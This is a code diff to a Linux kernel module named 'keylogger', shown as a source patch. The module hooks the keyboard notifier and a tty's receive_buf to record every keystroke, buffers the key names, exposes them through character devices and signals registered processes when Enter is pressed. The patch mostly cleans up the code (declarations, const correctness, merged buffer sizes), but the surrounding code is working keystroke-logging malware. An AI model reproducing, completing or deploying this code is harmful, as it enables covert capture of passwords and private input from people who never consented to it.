@@ -19,6 +19,7 @@
 
 #include "keymap.h"
 
+// Simple define to easily group all printk's from this module
 #define print812(...) printk( "<1>812 " ); printk( __VA_ARGS__ ); printk( "\n" );
 
 #define KEYLOG_MAJOR 65
@@ -26,7 +27,6 @@
 #define TTYLOG_MAJOR 66
 #define TTYLOG_NAME "ttylog"
 
-#define MAX_KEYS_TO_BUFFER 1024
 #define KEYLOG_BUF_SIZE 1024
 #define MAX_REGISTERED_PROCS 5
 
@@ -44,8 +44,6 @@ static struct logged_key *ttykey_buffer;
 static unsigned int num_tty_keys_logged = 0;
 
 static char *pid_buffer = NULL;
-static int cur_buf_length = 0;
-static int cur_ttybuf_length = 0;
 static pid_t registered_pids[MAX_REGISTERED_PROCS];
 static int registered_proc_count = 0;
 
@@ -56,41 +54,31 @@ static void (*old_receive_buf) (struct tty_struct *tty, const unsigned char *cp,
 struct file *file;
 struct tty_struct *tty;
 
-int key_open( struct inode *inode, struct file *filp );
 ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos );
 ssize_t tty_read( struct file *filp, char *buf, size_t count, loff_t *f_pos );
 ssize_t key_write( struct file *filp, const char *buf, size_t count, loff_t *f_pos );
-int key_release( struct inode *inode, struct file *filp );
 
 /**
 * Return 1 if key was interpreted as a meta key, 0 otherwise
 */
 static int interpret_meta_key( unsigned int keycode, unsigned int down );
-static int interpret_tty_meta_key( char* keycode );
+static int interpret_tty_meta_key( const char* keycode );
 
 struct file_operations fops = {
     read:    key_read,
     write:   key_write,
-    open:    key_open,
-    release: key_release,
 };
 
 struct file_operations ttyops = {
     read:    tty_read,
     write:   key_write,
-    open:    key_open,
-    release: key_release,
 };
-
-int key_open( struct inode *inode, struct file *filp ) {
-    print812( "Received an open" );
-
-    return 0;
-}
 
 ssize_t key_write( struct file *filp, const char *buf, size_t count, loff_t *f_pos ) {
     char *endptr;
-    int  err = 0;
+    int  err = 0, i = 0;
+    int initial_registered_count = registered_proc_count;
+    pid_t registered_pid;
 
     if ( count >= KEYLOG_BUF_SIZE ) {
         print812( "Writing too many bytes (%zu). Bailing", count );
@@ -103,7 +91,7 @@ ssize_t key_write( struct file *filp, const char *buf, size_t count, loff_t *f_p
         return 0;
     }
 
-    pid_t registered_pid = simple_strtol( pid_buffer, &endptr, 10 );
+    registered_pid = simple_strtol( pid_buffer, &endptr, 10 );
     if ( registered_pid == 0 && endptr == pid_buffer ) {
         print812( "Failed to parse pid" );
         return 0;
@@ -111,9 +99,6 @@ ssize_t key_write( struct file *filp, const char *buf, size_t count, loff_t *f_p
 
     print812( "PROC SENT: %d", registered_pid );
 
-    int initial_registered_count = registered_proc_count;
-
-    int i=0;
     for( i=0; i<MAX_REGISTERED_PROCS; i++ ) {
         if(registered_pids[i] == registered_pid) {
             print812( "Unregistering process %s", pid_buffer );
@@ -219,9 +204,10 @@ struct file* file_open(const char* path, int flags, int rights) {
 }
 
 // Sends the IO signal to let listening processes know a command was entered
-void SendKey()
-{
+static void SendKey( void ) {
     struct siginfo     *sinfo;    /* signal information */
+    int i = 0;
+    struct task_struct *task;
 
     sinfo = kzalloc( sizeof(struct siginfo), GFP_KERNEL );
     if ( sinfo == NULL ) {
@@ -231,10 +217,7 @@ void SendKey()
     sinfo->si_signo = SIGIO;
     sinfo->si_code = SI_USER;
   
-    int i=0;
     for(i=0; i<MAX_REGISTERED_PROCS; i++) { 
-        struct task_struct *task;
-
         if( registered_pids[i] != -1  ) {
             task =  pid_task( find_vpid( registered_pids[i] ), PIDTYPE_PID ); 
             if ( task == NULL ) {
@@ -256,16 +239,16 @@ void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, 
 	const char *key_name = NULL;
     unsigned int name_len = 0;
     struct logged_key *next_key = NULL; 
+    char dstStr[count + 1];
 
-    if(registered_proc_count && (count > 0))
+    if( registered_proc_count && (count > 0) )
     {
-        if (!tty->real_raw && !tty->raw)
+        if ( !tty->real_raw && !tty->raw )
         {
-            char dstStr[count + 1];
             strncpy(dstStr, cp, count);
             dstStr[count] = '\0';
             
-            key_name = get_tty_key_str(dstStr, count);
+            key_name = get_tty_key_str( dstStr, count );
 
             if( interpret_tty_meta_key( key_name ) ) {
                 /* call the original receive_buf */
@@ -311,7 +294,7 @@ int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_p
         }
 
         if ( param->down && registered_proc_count ) {
-            if ( num_keys_logged < MAX_KEYS_TO_BUFFER ) {
+            if ( num_keys_logged < KEYLOG_BUF_SIZE ) {
                 key_name = cur_keymap[param->value];
                 name_len = strlen( key_name );
                 next_key = &key_buffer[num_keys_logged];
@@ -360,7 +343,7 @@ static int interpret_meta_key( unsigned int keycode, unsigned int down  ) {
     return 0;
 }
 
-static int interpret_tty_meta_key( char* keycode ) {
+static int interpret_tty_meta_key( const char* keycode ) {
     if( strcmp( keycode, "[Enter]" ) == 0 ) {
         SendKey();
         return 1;
@@ -380,14 +363,9 @@ static struct notifier_block keyboardNotifierBlock = {
         .notifier_call = keylogger_notify
 };
 
-int key_release( struct inode *inode, struct file *filp ) {
-    print812( "In release method" );
-
-    return 0;
-}
-
 static int keylogger_init( void ) {
-    int err;
+    int err = 0, i = 0;
+
     print812( "Initializing the module." );
 
     err = register_chrdev( KEYLOG_MAJOR, KEYLOG_NAME, &fops );
@@ -402,7 +380,7 @@ static int keylogger_init( void ) {
         return err;
     }
 
-    key_buffer = kzalloc( sizeof(struct key) * MAX_KEYS_TO_BUFFER, GFP_KERNEL );
+    key_buffer = kzalloc( sizeof(struct key) * KEYLOG_BUF_SIZE, GFP_KERNEL );
     if ( !key_buffer ) {
         err = -ENOMEM;
         print812( "Failed to allocate keybuffer (%d)", err );
@@ -435,7 +413,6 @@ static int keylogger_init( void ) {
         return err;
     }
     
-    int i=0;
     for(i=0; i<MAX_REGISTERED_PROCS; i++) {
         registered_pids[i] = -1;
     }
